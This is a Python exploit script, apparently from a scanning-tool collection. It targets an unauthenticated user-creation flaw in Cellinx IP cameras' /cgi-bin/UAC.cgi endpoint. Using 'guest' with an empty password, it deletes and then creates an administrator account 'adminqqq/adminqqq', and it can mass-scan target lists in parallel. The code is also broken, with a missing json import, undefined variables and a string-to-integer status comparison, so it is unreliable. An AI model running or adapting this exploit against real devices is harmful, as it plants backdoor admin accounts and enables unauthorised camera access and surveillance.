# -*- coding: utf-8 -*-
import argparse
import base64
import re
import sys
from multiprocessing.dummy import Pool

import requests
import urllib3
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner():
    test = """
           8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
            Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
             Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
              "8aa8"      88           88,d88'      88 88  `8b   88 88             
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
                88        88           88     "88,  88 88     `888   `"Y88888P"   

                            888888888888 

                            tag: this is a  cellinx 摄像机 uac.cgi 未授权添加用户漏洞exp                                       
                                        @version: 1.0.0   @author: Y1_K1NG           
    """
    print(test)


def poc(target):
    if target[-1] == '/':
        target = target[:-1]
    else:
        target = target
    url = target + "/cgi-bin/UAC.cgi?TYPE=json"

    headers = {
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"
    }

    data1 = {
        "jsonData": {
            "username": "guest",
            "password": "",
            "option": "delete_user",
            "data": {
                "username": "adminqqq"
            }
        }
    }
    data2 = {
        "jsonData": {
            "username": "guest",
            "password": "",
            "option": "add_user",
            "data": {
                "username": "adminqqq",
                "password": "adminqqq",
                "permission": {
                    "is_admin": "1",
                    "view": "1",
                    "ptz": "1",
                    "setting": "1",
                    "dout": "1"
                }
            }
        }
    }

    json_data = json.dumps(data)
    try:
        response1 = requests.post(url, headers=headers, json=data1, verify=False, timeout=15)
        # print(response.request.headers)
        # print(response.request.body)
        # print(response.text)

        if response1.status_code == 200 :
            response2 = requests.post(url, headers=headers, json=data2, verify=False, timeout=15)

            if response2.status_code == "200" :
                print(f"[+] {target} 存在 未授权添加用户漏洞，用户名密码为adminqqq/adminqqq")
                with open("result.txt", "a+", encoding="utf-8") as f:
                        f.write(url_result + "\n")
            else:
                print(f"[-] {target} 不存在 漏洞")
        else:
            print(f"[-] {target} 不存在 漏洞")
    except Exception as e:
        print(f"[*] {target} error: {str(e)}")


def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(http://|https://)?([\w\.]+):?(\d+)?", url)
    if match:
        prefix, host, port = match.groups()
        if not port:
            if prefix and "https" in prefix:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()

    if args.url and not args.file:
        if "https://" in args.url or "http://" in args.url:
            url = args.url
        else:
            host, port = extract_host(args.url)
            url = f"http://{host}:{port}"
        poc(url)

    elif args.url is None and args.file is not None:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                if "https://" in url or "http://" in url:
                    url = url
                else:
                    host, port = extract_host(url)
                    url = f"http://{host}:{port}"
                url_list.append(url)

        pool = Pool(10)
        pool.map(poc, url_list)
        pool.close()
        pool.join()

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
